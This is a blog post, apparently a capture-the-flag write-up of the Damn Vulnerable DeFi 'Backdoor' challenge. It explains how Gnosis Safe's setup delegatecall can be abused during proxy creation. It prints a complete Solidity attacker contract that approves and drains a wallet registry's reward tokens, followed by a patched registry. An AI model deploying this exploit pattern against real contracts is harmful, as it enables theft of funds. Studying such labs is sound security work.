---
layout: post
title: Damn Vulnerable DeFi - Backdoor
---

## Description
To incentivize the creation of more secure wallets in their team, someone has deployed a registry of [Gnosis Safe wallets](https://github.com/safe-global/safe-contracts/blob/v1.3.0/contracts/GnosisSafe.sol). When someone in the team deploys and registers a wallet, they will earn 10 DVT tokens.

To make sure everything is safe and sound, the registry tightly integrates with the legitimate [Gnosis Safe Proxy Factory](https://github.com/safe-global/safe-contracts/blob/v1.3.0/contracts/proxies/GnosisSafeProxyFactory.sol), and has some additional safety checks.

Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them.

Your goal is to take all funds from the registry. In a single transaction.

## Solution
This one admittedly took me a while.

My first idea was to create Gnosis safes where I was an owner with the beneficiary, and then make the threshold
1, i.e. a 1/2 multisig where I could simply send the rewards to myself. But the wallet registry is smart enough
to check this in `proxyCreated`:

```
// Ensure wallet initialization is the expected
require(GnosisSafe(walletAddress).getThreshold() == MAX_THRESHOLD, "Invalid threshold");
require(GnosisSafe(walletAddress).getOwners().length == MAX_OWNERS, "Invalid number of owners"); 
```

I had to dig a little deeper into the proxy creation logic. To find the exploit, let's look at the [createProxyWithCallback](https://github.com/safe-global/safe-contracts/blob/v1.3.0/contracts/proxies/GnosisSafeProxyFactory.sol#L82) function on `GnosisSafeProxyFactory`.

```
function createProxyWithCallback(
    address _singleton,
    bytes memory initializer,
    uint256 saltNonce,
    IProxyCreationCallback callback
) public returns (GnosisSafeProxy proxy) {
    uint256 saltNonceWithCallback = uint256(keccak256(abi.encodePacked(saltNonce, callback)));
    proxy = createProxyWithNonce(_singleton, initializer, saltNonceWithCallback);
    if (address(callback) != address(0)) callback.proxyCreated(proxy, _singleton, initializer, saltNonce);
}
```

The `initializer` param looks promising, as it seems we can pass arbitrary data to it. Let's follow the codepath
into [createProxyWithNonce](https://github.com/safe-global/safe-contracts/blob/v1.3.0/contracts/proxies/GnosisSafeProxyFactory.sol#L61).

```
/// @dev Allows to create new proxy contact and execute a message call to the new proxy within one transaction.
/// @param _singleton Address of singleton contract.
/// @param initializer Payload for message call sent to new proxy contract.
/// @param saltNonce Nonce that will be used to generate the salt to calculate the address of the new proxy contract.
function createProxyWithNonce(
    address _singleton,
    bytes memory initializer,
    uint256 saltNonce
) public returns (GnosisSafeProxy proxy) {
    proxy = deployProxyWithNonce(_singleton, initializer, saltNonce);
    if (initializer.length > 0)
        // solhint-disable-next-line no-inline-assembly
        assembly {
            if eq(call(gas(), proxy, 0, add(initializer, 0x20), mload(initializer), 0, 0), 0) {
                revert(0, 0)
            }
        }
    emit ProxyCreation(proxy, _singleton);
}
```

Looks like it deploys the Gnosis Safe and immediately calls it using `initializer` for the calldata.
From `proxyCreated` in the WalletRegistry we know that our `initializer` calldata has to call the Gnosis
Safe's [setup](https://github.com/safe-global/safe-contracts/blob/v1.3.0/contracts/GnosisSafe.sol#L75) function.

```
// Ensure initial calldata was a call to `GnosisSafe::setup`
require(bytes4(initializer[:4]) == GnosisSafe.setup.selector, "Wrong initialization");
```

Let's turn our attention to the _setup_ function and see if there's anything we can do there.

```
/// @dev Setup function sets initial storage of contract.
/// @param _owners List of Safe owners.
/// @param _threshold Number of required confirmations for a Safe transaction.
/// @param to Contract address for optional delegate call.
/// @param data Data payload for optional delegate call.
/// @param fallbackHandler Handler for fallback calls to this contract
/// @param paymentToken Token that should be used for the payment (0 is ETH)
/// @param payment Value that should be paid
/// @param paymentReceiver Adddress that should receive the payment (or 0 if tx.origin)
function setup(
    address[] calldata _owners,
    uint256 _threshold,
    address to,
    bytes calldata data,
    address fallbackHandler,
    address paymentToken,
    uint256 payment,
    address payable paymentReceiver
) external {
    // setupOwners checks if the Threshold is already set, therefore preventing that this method is called twice
    setupOwners(_owners, _threshold);
    if (fallbackHandler != address(0)) internalSetFallbackHandler(fallbackHandler);
    // As setupOwners can only be called if the contract has not been initialized we don't need a check for setupModules
    setupModules(to, data);

    if (payment > 0) {
        // To avoid running into issues with EIP-170 we reuse the handlePayment function (to avoid adjusting code of that has been verified we do not adjust the method itself)
        // baseGas = 0, gasPrice = 1 and gas = payment => amount = (payment + 0) * 1 = payment
        handlePayment(payment, 0, 1, paymentToken, paymentReceiver);
    }
    emit SafeSetup(msg.sender, _owners, _threshold, to, fallbackHandler);
}
```

The `to` and `data` parameters stood out to me because they're parameters we can control **and** it's for a delegate call.
This means we're able to execute an arbitrary payload at an arbitrary address in the context of the safe. We can point this
at our attack contract and execute an ERC20 `approve` on behalf of the safe. Once we have a approval, we can transfer the tokens. Here's the attack contract:

```
contract BackdoorAttacker {
    function attack(
        address walletFactory,
        address singleton,
        IProxyCreationCallback walletRegistry,
        address _dvt,
        address[] memory beneficiaries
    ) external {
        DamnValuableToken dvt = DamnValuableToken(_dvt);
        GnosisSafeProxyFactory factory = GnosisSafeProxyFactory(walletFactory);

        for (uint256 i = 0; i < beneficiaries.length; ++i) {
            address[] memory owners = new address[](1);
            owners[0] = beneficiaries[i];

            // Set "to" to us. The GnosisSafeProxy will deletegate call to our `receveSetupCall` function
            // where we can do a DVT.approve for the attacker.
            GnosisSafeProxy proxy = factory.createProxyWithCallback(
                singleton,
                abi.encodeWithSelector(
                    GnosisSafe.setup.selector,
                    owners, // owners
                    1, // _threshold
                    address(this), // to
                    abi.encodeWithSelector(this.receiveSetupCall.selector, address(this), _dvt), // data
                    address(0), // fallbackHandler
                    address(0), // paymentToken
                    0, // payment
                    payable(address(0)) // paymentReceiver
                ),
                0,
                walletRegistry
            );

            dvt.transferFrom(address(proxy), msg.sender, dvt.balanceOf(address(proxy)));
        }
    }

    // The proxy delegate calls to us. We can transfer tokens to the attacker
    function receiveSetupCall(address attackContract, address _dvt) external {
        DamnValuableToken dvt = DamnValuableToken(_dvt);
        dvt.approve(attackContract, type(uint256).max);
    }
}
```

## Patched Contract
One way to patch this bug is to do more verification on the initializer data in `proxyCreated`. We can
reconstruct the setup payload using `abi.decode` and verify `to` is the null address. Right under the
check to make sure _setup_ was called, let's add this:

```
// Ensure that `to` was not an address that could execute an arbitrary payload
(,,address to,,,,,) = abi.decode(initializer[4:], (address[], uint256, address, bytes, address, address, uint256, address));
require(to == address(0), "`to` must be null address");
```

That makes sure that no arbitrary payload can be executed during safe setup. Here's the patched contract in full:

```
contract WalletRegistryV2 is IProxyCreationCallback, Ownable {
    
    uint256 private constant MAX_OWNERS = 1;
    uint256 private constant MAX_THRESHOLD = 1;
    uint256 private constant TOKEN_PAYMENT = 10 ether; // 10 * 10 ** 18
    
    address public immutable masterCopy;
    address public immutable walletFactory;
    IERC20 public immutable token;

    mapping (address => bool) public beneficiaries;

    // owner => wallet
    mapping (address => address) public wallets;

    constructor(
        address masterCopyAddress,
        address walletFactoryAddress, 
        address tokenAddress,
        address[] memory initialBeneficiaries
    ) {
        require(masterCopyAddress != address(0));
        require(walletFactoryAddress != address(0));

        masterCopy = masterCopyAddress;
        walletFactory = walletFactoryAddress;
        token = IERC20(tokenAddress);

        for (uint256 i = 0; i < initialBeneficiaries.length; i++) {
            addBeneficiary(initialBeneficiaries[i]);
        }
    }

    function addBeneficiary(address beneficiary) public onlyOwner {
        beneficiaries[beneficiary] = true;
    }

    function _removeBeneficiary(address beneficiary) private {
        beneficiaries[beneficiary] = false;
    }

    /**
     @notice Function executed when user creates a Gnosis Safe wallet via GnosisSafeProxyFactory::createProxyWithCallback
             setting the registry's address as the callback.
     */
    function proxyCreated(
        GnosisSafeProxy proxy,
        address singleton,
        bytes calldata initializer,
        uint256
    ) external override {
        // Make sure we have enough DVT to pay
        require(token.balanceOf(address(this)) >= TOKEN_PAYMENT, "Not enough funds to pay");

        address payable walletAddress = payable(proxy);

        // Ensure correct factory and master copy
        require(msg.sender == walletFactory, "Caller must be factory");
        require(singleton == masterCopy, "Fake mastercopy used");
        
        // Ensure initial calldata was a call to `GnosisSafe::setup`
        require(bytes4(initializer[:4]) == GnosisSafe.setup.selector, "Wrong initialization");
        // Ensure that `to` was not an address that could execute an arbitrary payload
        (,,address to,,,,,) = abi.decode(initializer[4:], (address[], uint256, address, bytes, address, address, uint256, address));
        require(to == address(0), "`to` must be null address");

        // Ensure wallet initialization is the expected
        require(GnosisSafe(walletAddress).getThreshold() == MAX_THRESHOLD, "Invalid threshold");
        require(GnosisSafe(walletAddress).getOwners().length == MAX_OWNERS, "Invalid number of owners");       

        // Ensure the owner is a registered beneficiary
        address walletOwner = GnosisSafe(walletAddress).getOwners()[0];

        require(beneficiaries[walletOwner], "Owner is not registered as beneficiary");

        // Remove owner as beneficiary
        _removeBeneficiary(walletOwner);

        // Register the wallet under the owner's address
        wallets[walletOwner] = walletAddress;

        // Pay tokens to the newly created wallet
        token.transfer(walletAddress, TOKEN_PAYMENT);        
    }
}
```